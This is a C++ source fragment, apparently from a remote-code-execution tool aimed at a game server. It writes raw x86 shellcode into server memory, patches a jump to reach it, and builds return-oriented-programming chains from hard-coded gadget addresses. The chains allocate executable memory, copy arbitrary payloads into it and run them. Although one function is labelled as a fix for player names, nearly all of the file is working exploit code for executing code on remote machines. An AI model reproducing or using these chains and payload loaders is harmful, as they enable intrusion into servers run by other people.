	unsigned char rawData[240] = { 0x53, 0x8B, 0x5C, 0x24, 0x08, 0x60, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x8B, 0xEC, 0x89, 0x45, 0xF8, 0x89, 0x5D, 0xF0, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xF8, 0x03, 0x45, 0xF4, 0x0F, 0xBE, 0x08, 0x85, 0xC9, 0x74, 0x0B, 0x8B, 0x55, 0xF4, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xF4, 0xEB, 0xE8, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x45, 0xFC, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xFC, 0x8B, 0x4D, 0xFC, 0x3B, 0x4D, 0xF4, 0x0F, 0x8D, 0x90, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xF8, 0x03, 0x55, 0xFC, 0x0F, 0xBE, 0x02, 0x83, 0xF8, 0x30, 0x7C, 0x0E, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x0F, 0xBE, 0x11, 0x83, 0xFA, 0x39, 0x7E, 0x54, 0x8B, 0x45, 0xF8, 0x03, 0x45, 0xFC, 0x0F, 0xBE, 0x08, 0x83, 0xF9, 0x41, 0x7C, 0x0E, 0x8B, 0x55, 0xF8, 0x03, 0x55, 0xFC, 0x0F, 0xBE, 0x02, 0x83, 0xF8, 0x5A, 0x7E, 0x38, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x0F, 0xBE, 0x11, 0x83, 0xFA, 0x61, 0x7C, 0x0E, 0x8B, 0x45, 0xF8, 0x03, 0x45, 0xFC, 0x0F, 0xBE, 0x08, 0x83, 0xF9, 0x7A, 0x7E, 0x1C, 0x8B, 0x55, 0xF8, 0x03, 0x55, 0xFC, 0x0F, 0xBE, 0x02, 0x83, 0xF8, 0x5F, 0x74, 0x0E, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x0F, 0xBE, 0x11, 0x83, 0xFA, 0x2D, 0x75, 0x12, 0x8B, 0x45, 0xF0, 0x03, 0x45, 0xFC, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x8A, 0x11, 0x88, 0x10, 0xEB, 0x09, 0x8B, 0x45, 0xF0, 0x03, 0x45, 0xFC, 0xC6, 0x00, 0x6F, 0xE9, 0x5B, 0xFF, 0xFF, 0xFF, 0x8B, 0xE5, 0x81, 0xC4, 0x00, 0x02, 0x00, 0x00, 0x61, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, };

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

	unsigned char jmp[5] = { 0 };


tryAgain:

	RCE_Memcpy(Allocated, rawData, sizeof(rawData));

	unsigned char BufferCheck[240] = { 0 };

	memcpy((void*)BufferCheck, (void*)GetServerMemory(Allocated, 240), 240);

	if (!memcmp(BufferCheck, rawData, 240))
	{
		int FromGamejmpAddress = LittleLong(CalculateRelativeJMPAddress(0x00687900, Allocated));
		jmp[0] = 0xE9;
		memcpy(jmp + 1, &FromGamejmpAddress, 4);

		RCE_Memcpy(0x00687900, jmp, sizeof(jmp));

		return true;
	}
	else {
		retries++;

		if (retries > 5)
			return false;

		goto tryAgain;
	}
}

bool FixNames()
{
	return /*FixSV_SanitizeName() &&*/ FixClientUserinfoChanged();
}


//void Dank()
//{
//	std::vector<unsigned int> stack;
//
//	stack.push_back(0x009615C3);					//pop eax
//	stack.push_back(0x00A2811C);					//VirtualAlloc Import Pointer
//	stack.push_back(0x00545DFB);					//mov eax, [eax]
//	stack.push_back(0x00731A5F);					//call eax ret
//	stack.push_back(0);								//addr
//	stack.push_back(0x1000);						//size
//	stack.push_back(MEM_COMMIT | MEM_RESERVE);		//addr
//	stack.push_back(PAGE_EXECUTE_READWRITE);		//permissions
//	stack.push_back(0x004D2BA0);					//mov dword_F9F2EC, eax
//	stack.push_back(0x0076D0C1);					//mov edx, eax
//	stack.push_back(0x00a1924b);					//lea eax, [esp + 4]
//	stack.push_back(0x00401220);					//pop esi
//	stack.push_back(-0x730);						//-0x400
//	stack.push_back(0x00602c83);					//add eax, esi
//	stack.push_back(0x00644DEE);					//pop esi pop ecx
//	stack.push_back(0x400);							//esi
//	stack.push_back(0x0095ED00);					//ecx memcpy 
//	stack.push_back(0x007E54C7);					//call ecx
//	stack.push_back(0);								//padding
//
//	stack.push_back(0x009621C3 - 0xC00);			//pop eax
//	stack.push_back(0xF9F2EC);						//Pointer
//	stack.push_back(0x005469FB - 0xC00);			//mov eax, [eax]
//	stack.push_back(0x0073265F - 0xC00);			//call eax
//
//	unsigned char* ropchainData = new unsigned char[0x800];
//
//	unsigned char rawData[23] = {
//		0x8D, 0x24, 0x24, 0x83, 0xC4, 0x04, 0x81, 0x3C, 0x24, 0x98, 0x58, 0x66,
//		0x00, 0x0F, 0x85, 0xF0, 0xFF, 0xFF, 0xFF, 0x83, 0xEC, 0x1C, 0xC3
//	};
//
//
//	memset(ropchainData, 0x90, 0x800);
//
//	int* bufferChain = (int*)(ropchainData + 0x700);
//
//	memcpy(ropchainData, rawData, 23);
//
//	for (int i = 0; i < stack.size(); i++)
//		bufferChain[i] = LittleLong(stack[i]);
//
//	ROP Chain;
//	Chain.SetUpChain();
//	Chain.Push(0x0040172B);					//pop ebx
//	Chain.Push(-0x10C);						//ebx
//	Chain.Push(0x0096d165);					//add esp, ebx
//	Chain.Push(0x009621C3 - 0xC00);			//pop eax
//	Chain.Push(0xF9F2EC);					//Pointer
//	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
//	Chain.Push(0x00809AC9);					//VirtualFree
//	Chain.Push(0x006905D3);					//ret
//	Chain.Push(0x006905D3);					//ret
//	Chain.Push(0x006905D3);					//ret
//	Chain.Push(0x00665898);					//add esp, ebx
//
//	Chain.ExecuteChain(ropchainData, 0x800);
//	Chain.ClearChain();
//
//	delete ropchainData;
//}


void ExecuteCrashlessChain(std::vector<unsigned int> chain)
{
	std::vector<unsigned int> stack;

	stack.push_back(0x009615C3);					//pop eax
	stack.push_back(0x00A2811C);					//VirtualAlloc Import Pointer
	stack.push_back(0x00545DFB);					//mov eax, [eax]
	stack.push_back(0x00731A5F);					//call eax ret
	stack.push_back(0);								//addr
	stack.push_back(0x1000);						//size
	stack.push_back(MEM_COMMIT | MEM_RESERVE);		//addr
	stack.push_back(PAGE_EXECUTE_READWRITE);		//permissions
	stack.push_back(0x004D2BA0);					//mov dword_F9F2EC, eax
	stack.push_back(0x0076D0C1);					//mov edx, eax
	stack.push_back(0x00a1924b);					//lea eax, [esp + 4]
	stack.push_back(0x00401220);					//pop esi
	stack.push_back(-0x130);						//-0x400
	stack.push_back(0x00602c83);					//add eax, esi
	stack.push_back(0x00644DEE);					//pop esi pop ecx
	stack.push_back(0x400);							//esi
	stack.push_back(0x0095ED00);					//ecx memcpy 
	stack.push_back(0x007E54C7);					//call ecx
	stack.push_back(0);								//padding

	for (int i = 0; i < chain.size(); i++)
		stack.push_back(chain[i]);

	stack.push_back(0x009621C3 - 0xC00);			//pop eax
	stack.push_back(0xF9F2EC);						//Pointer
	stack.push_back(0x005469FB - 0xC00);			//mov eax, [eax]
	stack.push_back(0x0073265F - 0xC00);			//call eax

	unsigned char* ropchainData = new unsigned char[0x800];

	unsigned char rawData[23] = {
		0x8D, 0x24, 0x24, 0x83, 0xC4, 0x04, 0x81, 0x3C, 0x24, 0x98, 0x58, 0x66,
		0x00, 0x0F, 0x85, 0xF0, 0xFF, 0xFF, 0xFF, 0x83, 0xEC, 0x1C, 0xC3
	};


	memset(ropchainData, 0x90, 0x800);

	int* bufferChain = (int*)(ropchainData + 0x100);

	memcpy(ropchainData, rawData, 23);

	for (int i = 0; i < stack.size(); i++)
		bufferChain[i] = LittleLong(stack[i]);

	ROP Chain;
	Chain.SetUpChain();
	Chain.Push(0x0040172B);					//pop ebx
	Chain.Push(-0x70C);						//ebx
	Chain.Push(0x0096d165);					//add esp, ebx
	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(0xF9F2EC);					//Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
	Chain.Push(0x00809AC9);					//VirtualFree
	Chain.Push(0x006905D3);					//ret
	Chain.Push(0x006905D3);					//ret
	Chain.Push(0x006905D3);					//ret
	Chain.Push(0x00665898);					//add esp, ebx

	Chain.ExecuteChain(ropchainData, 0x800);
	Chain.ClearChain();

	delete ropchainData;
}

void ExecutePayload(unsigned char* payload, int size)
{
	std::vector<unsigned int> stack;

	stack.push_back(0x009615C3);					//pop eax
	stack.push_back(0x00A2811C);					//VirtualAlloc Import Pointer
	stack.push_back(0x00545DFB);					//mov eax, [eax]
	stack.push_back(0x00731A5F);					//call eax ret
	stack.push_back(0);								//addr
	stack.push_back(0x1000);						//size
	stack.push_back(MEM_COMMIT | MEM_RESERVE);		//addr
	stack.push_back(PAGE_EXECUTE_READWRITE);		//permissions
	stack.push_back(0x004D2BA0);					//mov dword_F9F2EC, eax
	stack.push_back(0x0076D0C1);					//mov edx, eax
	stack.push_back(0x00a1924b);					//lea eax, [esp + 4]
	stack.push_back(0x00401220);					//pop esi
	stack.push_back(-0x730);						//-0x400
	stack.push_back(0x00602c83);					//add eax, esi
	stack.push_back(0x00644DEE);					//pop esi pop ecx
	stack.push_back(0x400);							//esi
	stack.push_back(0x0095ED00);					//ecx memcpy 
	stack.push_back(0x007E54C7);					//call ecx
	stack.push_back(0);								//padding


	stack.push_back(0x009621C3 - 0xC00);			//pop eax
	stack.push_back(0xF9F2EC);						//Pointer
	stack.push_back(0x005469FB - 0xC00);			//mov eax, [eax]
	stack.push_back(0x0073265F - 0xC00);			//call eax

	unsigned char* ropchainData = new unsigned char[0x800];

	unsigned char rawData[24] = {
		0x8D, 0x24, 0x24, 0x83, 0xC4, 0x04, 0x81, 0x3C, 0x24, 0x98, 0x58, 0x66,
		0x00, 0x0F, 0x85, 0xF0, 0xFF, 0xFF, 0xFF, 0x83, 0xEC, 0x1C, 0x90, 0x90
	};

	memset(ropchainData, 0x90, 0x800);

	int* bufferChain = (int*)(ropchainData + 0x700);

	memcpy(ropchainData, rawData, 24);

	memcpy(ropchainData + 24, payload, size);

	for (int i = 0; i < stack.size(); i++)
		bufferChain[i] = LittleLong(stack[i]);

	ROP Chain;
	Chain.SetUpChain();
	Chain.Push(0x0040172B);					//pop ebx
	Chain.Push(-0x10C);						//ebx
	Chain.Push(0x0096d165);					//add esp, ebx
	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(0xF9F2EC);					//Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
	Chain.Push(0x00809AC9);					//VirtualFree
	Chain.Push(0x006905D3);					//ret
	Chain.Push(0x006905D3);					//ret
	Chain.Push(0x006905D3);					//ret
	Chain.Push(0x00665898);					//add esp, ebx

	Chain.ExecuteChain(ropchainData, 0x800);
	Chain.ClearChain();

	delete ropchainData;
}